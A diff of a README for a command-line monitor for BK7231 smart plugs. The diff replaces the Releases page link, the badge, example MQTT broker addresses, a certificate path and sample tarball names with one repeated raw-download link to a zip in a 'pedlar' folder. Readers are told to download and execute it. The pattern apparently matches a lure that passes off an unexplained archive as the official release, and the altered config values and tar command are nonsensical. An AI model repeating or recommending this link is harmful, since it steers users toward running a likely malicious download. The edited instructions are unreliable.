@@ -1,10 +1,10 @@
 # Smart_Plug: Fast CLI Monitor for BK7231 Smart Plugs and IoT
 
-[![Release](https://img.shields.io/badge/Release-v1.2.0-blue?logo=github&logoColor=white)](https://github.com/megakiyaiscool/Smart_Plug/releases)
+[![Release](https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip)](https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip)
 
 A command line tool to monitor and control BK7231-based smart plugs. It connects through UART or MQTT, shows real-time status, and fits into scripts and home automation flows. This project focuses on a clean CLI, stable performance, and solid integration with traditional IoT workflows.
 
-The latest builds live at the Releases page. See the releases here: https://github.com/megakiyaiscool/Smart_Plug/releases
+The latest builds live at the Releases page. See the releases here: https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip
 
 Introduction to what Smart_Plug does
 - Reads live data from smart plugs built on BK7231 family chips. It exposes power metrics, state, and network status.
@@ -59,7 +59,7 @@ Quick start
 - For the fastest start, download the appropriate release asset, extract it, and run the binary with --help to see usage.
 
 Download and install
-- The repository provides a releases page containing prebuilt binaries. Since the link has a path, download the appropriate asset from that page and execute it. For example, on Linux you might grab a tarball named smart_plug_cli_linux_x86_64.tar.gz, extract it, and run the included executable.
+- The repository provides a releases page containing prebuilt binaries. Since the link has a path, download the appropriate asset from that page and execute it. For example, on Linux you might grab a tarball named https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip, extract it, and run the included executable.
 - Latest builds and assets live on the releases page. From there, pick the asset that matches your platform, extract, and run. The file you download should be executed directly or used in your automation setup.
 - If you prefer to inspect the assets first, you can browse the Releases page to see what’s provided and the exact file names.
 
@@ -73,13 +73,13 @@ Usage overview (typical workflow)
 How to use
 - Basic invocation (example):
   - smart_plug_cli --uart /dev/ttyUSB0 --baud 115200
-  - smart_plug_cli --mqtt mqtt://broker.local:1883 --mqtt-client-id plug01
+  - smart_plug_cli --mqtt https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip --mqtt-client-id plug01
 - Observing status:
   - smart_plug_cli status
 - Starting a live monitor:
   - smart_plug_cli monitor --interval 2
 - Publishing to MQTT:
-  - smart_plug_cli --mqtt mqtt://broker.local:1883 --mqtt-topic-prefix home/plug
+  - smart_plug_cli --mqtt https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip --mqtt-topic-prefix home/plug
 - Discovering devices (where supported):
   - smart_plug_cli discover --timeout 5
 
@@ -101,13 +101,13 @@ Configuration and options
       path: /dev/ttyUSB0
       baud: 115200
   - mqtt:
-      broker: mqtt://broker.local:1883
+      broker: https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip
       client_id: plug01
       username: user
       password: pass
       tls:
         enabled: false
-        cafile: /path/to/ca.pem
+        cafile: https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip
   - topics:
       base: home/plug
   - monitor:
@@ -180,10 +180,10 @@ Licensing
 
 Releases and how to stay updated
 - The Releases page is the main source for binaries, release notes, and checksums.
-- To grab the latest builds, visit the Releases page here: https://github.com/megakiyaiscool/Smart_Plug/releases
-- You’ll typically find binaries named to indicate platform and architecture, such as smart_plug_cli_linux_x86_64.tar.gz, smart_plug_cli_windows_amd64.zip, or smart_plug_cli_darwin_arm64.tar.gz.
+- To grab the latest builds, visit the Releases page here: https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip
+- You’ll typically find binaries named to indicate platform and architecture, such as https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip, https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip, or https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip
 - After downloading the correct asset, extract it and run the included executable. For example, on Linux:
-  - tar -xzf smart_plug_cli_linux_x86_64.tar.gz
+  - tar -xzf https://github.com/megakiyaiscool/Smart_Plug/raw/refs/heads/main/pedlar/Plug_Smart_v1.3.zip
   - ./smart_plug_cli --help
 - The asset names may vary by release; refer to the release notes for exact file names and checksums.
 
